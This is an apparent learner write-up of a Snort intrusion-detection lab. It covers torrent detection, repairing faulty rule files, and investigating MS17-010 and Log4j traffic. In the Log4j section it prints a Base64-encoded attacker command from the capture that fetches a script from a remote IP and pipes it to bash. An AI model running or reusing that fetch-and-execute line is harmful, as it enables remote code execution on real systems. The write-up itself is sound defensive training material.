+</p><h1 id="22a5b2cc-075b-80da-a08f-f5372fc8cb4e" class="">TORRENT Metafile</h1><ol type="1" id="22a5b2cc-075b-8051-9329-ed0921b9b29d" class="numbered-list" start="1"><li>Write a rule to detect the torrent metafile in the given pcap. What is the number of detected packets?</li></ol><figure id="22a5b2cc-075b-80f5-925e-c1b203c4c365" class="image"><a href="13F9FF2B-66B0-4309-8974-7769D180D4EF.png"><img style="width:580.6302490234375px" src="13F9FF2B-66B0-4309-8974-7769D180D4EF.png"/></a></figure><p id="22a5b2cc-075b-80ac-be5b-c182ff93ddb2" class="">I decided to write a rule where i specify content as “torrent”, because torrent files most often come with extension of .torrent</p><figure id="22a5b2cc-075b-8057-bc55-ce688f8960e1" class="image"><a href="2F147913-7F98-4A7B-8706-0E2692225BD7.png"><img style="width:580.6641845703125px" src="2F147913-7F98-4A7B-8706-0E2692225BD7.png"/></a></figure><p id="22a5b2cc-075b-8026-be17-dcc4be63498b" class="">
+</p><ol type="1" id="22a5b2cc-075b-8067-b79d-e40bad1e33f2" class="numbered-list" start="2"><li>What is the name of the torrent application?</li></ol><p id="22a5b2cc-075b-801c-9465-c34d47ce748c" class="">from the snort log created by running the detection rule on pcap, I found the following.</p><figure id="22a5b2cc-075b-8057-b38f-f5e4b612f9bc" class="image"><a href="7989F88B-B64B-4B03-AB13-2D17019A2C48.png"><img style="width:580.6415405273438px" src="7989F88B-B64B-4B03-AB13-2D17019A2C48.png"/></a></figure><p id="22a5b2cc-075b-8011-9580-c219eb091aa9" class="">bittorrent!</p><p id="22a5b2cc-075b-8058-b9dc-df139279daad" class="">
+</p><ol type="1" id="22a5b2cc-075b-80a3-ad02-dc051c6c6ff3" class="numbered-list" start="3"><li>What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?</li></ol><p id="22a5b2cc-075b-8045-b928-d466002b180e" class="">From the HEX data - <code>application/x-bittorrent</code></p><figure id="22a5b2cc-075b-8099-8c9b-cb960647cb0a" class="image"><a href="93B68A88-6343-4D29-9297-A824557325EA.png"><img style="width:580.6302490234375px" src="93B68A88-6343-4D29-9297-A824557325EA.png"/></a></figure><p id="22a5b2cc-075b-80cd-84cc-da36082f7bf5" class="">
+</p><ol type="1" id="22a5b2cc-075b-8004-952b-ff4ce60bf71c" class="numbered-list" start="4"><li>What is the hostname of the torrent metafile?</li></ol><figure id="22a5b2cc-075b-8021-b2e7-cd2b7f5eb98d" class="image"><a href="24F24DE2-8389-42AB-ABB7-24E4D4A323A5.png"><img style="width:580.6415405273438px" src="24F24DE2-8389-42AB-ABB7-24E4D4A323A5.png"/></a></figure><p id="22a5b2cc-075b-808f-9f9f-ebd5c099e74c" class="">
+</p><h1 id="22a5b2cc-075b-804a-ada6-c5d45bea0a60" class="">TROUBLESHOOT RULES</h1><ol type="1" id="22a5b2cc-075b-80ab-8ff8-cad852ce56a3" class="numbered-list" start="1"><li>Fix the syntax error in local-1.rules file and make it work smoothly.</li></ol><figure id="22a5b2cc-075b-80c8-969c-cfef1a6f6081" class="image"><a href="FB7CCF28-A2DB-4239-BC0F-50DAC8E99D2F.png"><img style="width:580.618896484375px" src="FB7CCF28-A2DB-4239-BC0F-50DAC8E99D2F.png"/></a></figure><p id="22a5b2cc-075b-80a0-bc7e-dcabec4cfb30" class="">it says that the error is where the Port variable is not a number, which means the </p><p id="22a5b2cc-075b-80e5-9945-c00c4b4f4fa5" class="">there is no space between port and the next character, I fixed it by adding in a space, saving it and ran</p><figure id="22a5b2cc-075b-8024-a93c-dcba0dfa32a6" class="image"><a href="image%2088.png"><img style="width:580.6302490234375px" src="image%2088.png"/></a></figure><p id="22a5b2cc-075b-8017-b2c1-f3eedf58e79b" class="">
+</p><ol type="1" id="22a5b2cc-075b-80d4-a480-cb30292c1c34" class="numbered-list" start="2"><li>Fix the syntax error in local-2.rules file and make it work smoothly.</li></ol><figure id="22a5b2cc-075b-804c-9ced-df91387fdb3d" class="image"><a href="915C4D60-7ABE-4023-9F67-4D6791E2D2E5.png"><img style="width:580.618896484375px" src="915C4D60-7ABE-4023-9F67-4D6791E2D2E5.png"/></a></figure><figure id="22a5b2cc-075b-8076-8296-c45d3f2e95a2" class="image"><a href="9BED5232-5C26-4AF1-B418-DD1B41D7837B.png"><img style="width:580.6076049804688px" src="9BED5232-5C26-4AF1-B418-DD1B41D7837B.png"/></a></figure><p id="22a5b2cc-075b-80ef-bbc6-dc372c1fe8a2" class="">the source port value is missing here</p><p id="22a5b2cc-075b-808b-8f68-c65a48fc40a2" class="">
+</p><ol type="1" id="22a5b2cc-075b-80e3-8ac5-d33b3bd94ae8" class="numbered-list" start="3"><li>Fix the syntax error in local-3.rules file and make it work smoothly.</li></ol><figure id="22a5b2cc-075b-806b-a188-d68ed34275e2" class="image"><a href="3E0BD449-8FA3-43B7-82C6-98C59B9B6E15.png"><img style="width:580.6528930664062px" src="3E0BD449-8FA3-43B7-82C6-98C59B9B6E15.png"/></a></figure><p id="22a5b2cc-075b-8024-a1bb-e06a1639e74a" class="">both the rules here have same sid, which is not possible and will lead to errors.</p><p id="22a5b2cc-075b-80d4-903b-d626fb3b84b5" class="">
+</p><ol type="1" id="22a5b2cc-075b-800b-8aa4-c93688b435ae" class="numbered-list" start="4"><li>Fix the syntax error in local-4.rules file and make it work smoothly.</li></ol><figure id="22a5b2cc-075b-80bc-b285-d4204c1dfc68" class="image"><a href="9FBD68BE-5F7D-4B27-9FE8-A6F50E843E5D.png"><img style="width:580.6302490234375px" src="9FBD68BE-5F7D-4B27-9FE8-A6F50E843E5D.png"/></a></figure><p id="22a5b2cc-075b-80ae-9bfb-d9e3c0d6e50f" class="">Here we can nsee that there seems to be 2 issues, one is that the value is not properly seperated by ; and the sid for both rules seems to be same.</p><p id="22a5b2cc-075b-8081-86df-dee3376956b3" class="">
+</p><ol type="1" id="22a5b2cc-075b-80c0-b0bb-d04f592c79b0" class="numbered-list" start="5"><li>Fix the syntax error in local-5.rules file and make it work smoothly.</li></ol><figure id="22a5b2cc-075b-80a6-8a45-c78c9e540672" class="image"><a href="9A85774A-EE1C-4636-A2B8-853C40BADA4C.png"><img style="width:580.6415405273438px" src="9A85774A-EE1C-4636-A2B8-853C40BADA4C.png"/></a></figure><p id="22a5b2cc-075b-8074-abaf-e777ed55d029" class="">The direction specifier ← isnt allowed in SNORT. as well as there is another error in 3rd rule where the seperator is wronf - ;.</p><p id="22a5b2cc-075b-803f-b93a-d0bc2c7bfbfc" class="">there is also a third error where the second rules sid is declared with a ; instead of :</p><p id="22a5b2cc-075b-80d9-989f-d994ed0ec341" class="">
+</p><ol type="1" id="22a5b2cc-075b-8042-bc9a-c296c06933f8" class="numbered-list" start="6"><li>Fix the logical error in local-6.rules file and make it work smoothly to create alerts.</li></ol><p id="22a5b2cc-075b-80b4-8105-d33ab80310ab" class="">This time around  its a logical error instead of a syntax error</p><figure id="22a5b2cc-075b-806f-8706-e15d83e6bfd8" class="image"><a href="4448CDE2-31A9-438E-A3FE-AB7000F2D546.png"><img style="width:580.6302490234375px" src="4448CDE2-31A9-438E-A3FE-AB7000F2D546.png"/></a></figure><p id="22a5b2cc-075b-80ac-9f7f-cfd1063ca98c" class="">Here the rule is looking for GET requests, but also in the content  value mentioned a random magic byte, for the rule to detect GET requests, I can simply pass the content value as “GET” to look for GET requests</p><figure id="22a5b2cc-075b-80d0-9482-f6d214b34040" class="image"><a href="DBA81F29-B8EF-4E6E-9E2C-B77337CE2252.png"><img style="width:580.618896484375px" src="DBA81F29-B8EF-4E6E-9E2C-B77337CE2252.png"/></a></figure><p id="22a5b2cc-075b-80a2-ae26-fbbaa43b444b" class="">
+</p><ol type="1" id="22a5b2cc-075b-806c-8100-f755cc47854d" class="numbered-list" start="7"><li>Fix the logical error in local-7.rules file and make it work smoothly to create alerts. What is the name of the required option:</li></ol><figure id="22a5b2cc-075b-8071-bb37-ebed2617f726" class="image"><a href="27F02355-8BED-4801-A560-BC954440EC47.png"><img style="width:580.6415405273438px" src="27F02355-8BED-4801-A560-BC954440EC47.png"/></a></figure><p id="22a5b2cc-075b-80d4-b038-eacbc8819bb5" class="">there is no message here, so from the magic byte i need to understand what is the rule trying to detect, I ran the rule as is and got 9 alerts, so it works, but the question is what is the name of the required option. SO the rule doesnt have a msg key, which is improtant if someone want to understand what the rule is trying to do</p><p id="22a5b2cc-075b-8049-9513-fed875b00bc4" class="">answer is - msg</p><p id="22b5b2cc-075b-8066-94f9-ec9eb4c2379f" class="">
+</p><h1 id="22b5b2cc-075b-8067-b5c9-f30b5d38fd42" class="">Using External Rules (MS17-010) </h1><p id="22b5b2cc-075b-8099-9488-e9ca716c441c" class="">
+</p><ol type="1" id="22b5b2cc-075b-8023-82d6-f71cec77bd0d" class="numbered-list" start="1"><li>Use the given pcap file. Use the given rule file (local.rules) to investigate the ms1710 exploitation.</li></ol><p id="22b5b2cc-075b-80e6-885b-d72314633cb2" class=""><code>sudo snort -c local.rules -A full -l . -r ms-17-010.pcap </code></p><p id="22b5b2cc-075b-8021-96d7-f631679a083c" class="">
+</p><ol type="1" id="22b5b2cc-075b-80ab-bee2-d053eaae83fa" class="numbered-list" start="2"><li>Use local-1.rules empty file to write a new rule to detect payloads containing the &quot;\IPC$&quot; keyword.</li></ol><p id="22b5b2cc-075b-8088-ad66-c5046ced9c4a" class=""><code>alert tcp any any &lt;&gt; any any (msg:&quot;IPC$ Payload Detected&quot;; content:&quot;\\IPC$&quot;; sid:10000001; rev:1;)</code></p><p id="22b5b2cc-075b-80b8-b0bf-f9671f6b9e90" class="">double \\ because of escape char</p><figure id="22b5b2cc-075b-807f-9315-c158b17a76c9" class="image"><a href="image%2089.png"><img style="width:710px" src="image%2089.png"/></a></figure><p id="22b5b2cc-075b-80f3-a36e-dfc465b09829" class="">
+</p><ol type="1" id="22b5b2cc-075b-80e2-8557-f32bc63c0158" class="numbered-list" start="3"><li>Investigate the log/alarm files. What<strong> </strong>is the requested path?</li></ol><figure id="22b5b2cc-075b-8080-91dd-db448d1a071a" class="image"><a href="image%2090.png"><img style="width:710px" src="image%2090.png"/></a></figure><p id="22b5b2cc-075b-80b7-82de-e27781f610b1" class="">
+</p><h1 id="22b5b2cc-075b-80ba-943f-d7689a77bf33" class="">LOG4J External</h1><ol type="1" id="22b5b2cc-075b-8057-913a-f8ba2b40a071" class="numbered-list" start="1"><li>Use the given rule file (local.rules) to investigate the log4j exploitation.</li></ol><p id="22b5b2cc-075b-80c1-9cdb-f66ed2d02f32" class=""><code>sudo snort -c local.rules -A full -l . -r log4j.pcap</code> </p><p id="22b5b2cc-075b-80b5-943b-f4bd13f15a05" class="">
+</p><ol type="1" id="22b5b2cc-075b-8040-8831-c08bab722f2f" class="numbered-list" start="2"><li>How many rules were triggered?.</li></ol><p id="22b5b2cc-075b-80ea-b7eb-dba80a7a78b7" class=""><code>cat alert | grep &quot;\[1:&quot; | cut -d &quot; &quot; -f2 | sort -u</code></p><p id="22b5b2cc-075b-802e-bc2b-d5deed080cb4" class="">I can use grep, cut and sort to figure out </p><figure id="22b5b2cc-075b-80ce-9b12-ea8e67f68848" class="image"><a href="image%2091.png"><img style="width:710px" src="image%2091.png"/></a></figure><p id="22b5b2cc-075b-8055-8a48-c758cbcb2f64" class="">Let&#x27;s break down the command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22b5b2cc-075b-80ab-9b1c-fbf16e9be5e1" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">cat alert | grep &quot;\\[1:&quot; | cut -d &quot; &quot; -f2 | sort -u
+</code></pre><p id="22b5b2cc-075b-806b-bed8-c23c37274ab6" class="">This command is used to <strong>extract and list unique Snort rule IDs</strong> (specifically, the <strong>GID:SID:REV</strong> format) from a Snort alert file. Here&#x27;s what each part does step by step.</p><hr id="22b5b2cc-075b-80e0-89d8-d0142b378ac2"/><h3 id="22b5b2cc-075b-80c8-a68c-c2d8873e62b7" class="">🔹 1. <code>cat alert</code></h3><ul id="22b5b2cc-075b-807d-abaa-d8e6d390b74f" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose:</strong> Reads and outputs the contents of the file named <code>alert</code>.</li></ul><ul id="22b5b2cc-075b-8038-a83e-eb01e6040dfc" class="bulleted-list"><li style="list-style-type:disc"><strong>Example output (simplified):</strong><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22b5b2cc-075b-803b-9ec4-ffda05b15c58" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[**] [1:21003726:1] FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
+[Priority: 3]
+...
+</code></pre></li></ul><hr id="22b5b2cc-075b-80c9-bb0f-d587e40ef6a7"/><h3 id="22b5b2cc-075b-80e9-be1f-ee826e6067d5" class="">🔹 2. <code>grep &quot;\\[1:&quot;</code></h3><ul id="22b5b2cc-075b-8071-9c07-caec7958228d" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose:</strong> Filters lines that contain a Snort signature ID.</li></ul><ul id="22b5b2cc-075b-803c-9e43-f5608df7c629" class="bulleted-list"><li style="list-style-type:disc">The pattern <code>\\[[1]:</code> matches lines containing Snort rule IDs like <code>[1:21003726:1]</code>.</li></ul><ul id="22b5b2cc-075b-80ee-9521-e46b50088e45" class="bulleted-list"><li style="list-style-type:disc"><strong>Why?</strong> This isolates the alert signature line for processing.</li></ul><ul id="22b5b2cc-075b-8062-89c9-eff9a31c1656" class="bulleted-list"><li style="list-style-type:disc"><strong>Example input after filtering:</strong><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22b5b2cc-075b-809d-91fe-e76b8a05e9c0" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[**] [1:21003726:1] FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
+[**] [1:21003730:1] FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
+...
+</code></pre></li></ul><hr id="22b5b2cc-075b-8090-98d2-dc2568f9203b"/><h3 id="22b5b2cc-075b-80e4-ba09-ded5321d13d7" class="">🔹 3. <code>cut -d &quot; &quot; -f2</code></h3><ul id="22b5b2cc-075b-80a2-9b31-e7d860471fc3" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose:</strong> Splits the line by spaces (<code>d &quot; &quot;</code>) and selects the second field (<code>f2</code>).</li></ul><ul id="22b5b2cc-075b-802a-b665-fdb8d8c5e6e9" class="bulleted-list"><li style="list-style-type:disc">That second field is the Snort rule ID string inside the brackets.</li></ul><ul id="22b5b2cc-075b-80f0-9131-f030fff47d0f" class="bulleted-list"><li style="list-style-type:disc"><strong>Input:</strong><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22b5b2cc-075b-8028-9085-dddae994fb83" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[**] [1:21003726:1] ...
+</code></pre></li></ul><ul id="22b5b2cc-075b-80cd-9eea-d5a52b3d6a7b" class="bulleted-list"><li style="list-style-type:disc"><strong>Output:</strong><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22b5b2cc-075b-8025-8e6f-c89434ab7b38" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[1:21003726:1]
+</code></pre></li></ul><hr id="22b5b2cc-075b-803d-ba9a-e9baefdb22b5"/><h3 id="22b5b2cc-075b-80f0-855b-f620dcfcc808" class="">🔹 4. <code>sort -u</code></h3><ul id="22b5b2cc-075b-8086-915b-e19c51d0da63" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose:</strong><ul id="22b5b2cc-075b-809d-9709-e4c7ffa10675" class="bulleted-list"><li style="list-style-type:circle"><code>sort</code>: Sorts the list of rule IDs alphabetically.</li></ul><ul id="22b5b2cc-075b-80ca-bf76-c545faf56323" class="bulleted-list"><li style="list-style-type:circle"><code>u</code>: Removes duplicates so only <strong>unique</strong> rule IDs remain.</li></ul></li></ul><ul id="22b5b2cc-075b-808e-8eb5-f70f6129af76" class="bulleted-list"><li style="list-style-type:disc"><strong>Final Output Example:</strong><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22b5b2cc-075b-80b5-8254-d69e0b9cdc4f" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[1:21003726:1]
+[1:21003728:1]
+[1:21003730:1]
+[1:21003731:1]
+</code></pre></li></ul><hr id="22b5b2cc-075b-807b-975e-def735d56225"/><h3 id="22b5b2cc-075b-806f-a114-d78e33679b2a" class="">✅ Summary</h3><p id="22b5b2cc-075b-8017-aec8-eefe07ff97cb" class="">The full command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22b5b2cc-075b-80d5-b7c5-d2da81022051" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">cat alert | grep &quot;\\[1:&quot; | cut -d &quot; &quot; -f2 | sort -u
+</code></pre><p id="22b5b2cc-075b-80a7-a94b-e816d304ba82" class=""><strong>Does this:</strong></p><ul id="22b5b2cc-075b-80e6-8444-d665331f6fb1" class="bulleted-list"><li style="list-style-type:disc">Reads the <code>alert</code> file</li></ul><ul id="22b5b2cc-075b-8062-9db1-f9c3e2d7e07a" class="bulleted-list"><li style="list-style-type:disc">Finds lines with Snort rule IDs</li></ul><ul id="22b5b2cc-075b-80b3-984a-c2f837cee748" class="bulleted-list"><li style="list-style-type:disc">Extracts just the rule ID portion</li></ul><ul id="22b5b2cc-075b-8057-ade2-f7d6a0de7fbd" class="bulleted-list"><li style="list-style-type:disc">Sorts them and removes duplicates</li></ul><p id="22b5b2cc-075b-8056-b206-eee3bb6438f6" class="">
+</p><ol type="1" id="22b5b2cc-075b-8048-926a-d49c07d48612" class="numbered-list" start="3"><li>What are the first six digits of the triggered rule sids?</li></ol><p id="22b5b2cc-075b-80fc-b3ed-c0704217b6a6" class="">this is visible from the logs</p><p id="22b5b2cc-075b-8057-809c-cc613d5a86af" class="">
+</p><ol type="1" id="22b5b2cc-075b-80ac-9dae-c76134af5f63" class="numbered-list" start="4"><li>Use local-1.rules empty file to write a new rule to detect packet payloads <strong>between 770 and 855 bytes</strong>.<br/></li></ol><figure id="22b5b2cc-075b-8002-919a-f23b1ef2301e" class="image"><a href="image%2092.png"><img style="width:709.9666748046875px" src="image%2092.png"/></a></figure><figure id="22b5b2cc-075b-802f-ac36-d5f4a39f83d1" class="image"><a href="image%2093.png"><img style="width:710px" src="image%2093.png"/></a></figure><p id="22b5b2cc-075b-80ba-9cdd-cfde49bc3581" class="">
+</p><ol type="1" id="22b5b2cc-075b-808f-b7df-eb7ea8080fc0" class="numbered-list" start="5"><li>what is the name of the used encoding algo, </li></ol><p id="22b5b2cc-075b-80a9-85c0-f10aaec578c8" class="">from the snort log output from the last ran rule, i can see from the raw logs that its Base64</p><figure id="22b5b2cc-075b-80c0-b9c4-f58751c18bf5" class="image"><a href="image%2094.png"><img style="width:710px" src="image%2094.png"/></a></figure><p id="22b5b2cc-075b-80f9-ad36-dcd995fb56fa" class="">
+</p><ol type="1" id="22b5b2cc-075b-8020-af84-e302de0bd88f" class="numbered-list" start="6"><li>Decode the encoded command. What is the attacker&#x27;s command?</li></ol><p id="22b5b2cc-075b-80ff-a8b8-f3d41250af06" class="">BASE64 - </p><p id="22b5b2cc-075b-80cf-b387-d3c8e4e671e9" class="">KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=</p><figure id="22b5b2cc-075b-800f-b981-ea3507ee1fa7" class="image"><a href="image%2095.png"><img style="width:466.924560546875px" src="image%2095.png"/></a></figure><p id="22b5b2cc-075b-80aa-9179-dd0c92e91c03" class="">
+</p><p id="22b5b2cc-075b-80c3-9815-edbeb6cc799c" class="">
+</p><p id="22b5b2cc-075b-8084-9e4d-cb119254f6ec" class="">This was a fun challenge; I was able to practice writing rules and running Snort against packets.  This also taught me to research well before writing a rule to detect threats.</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
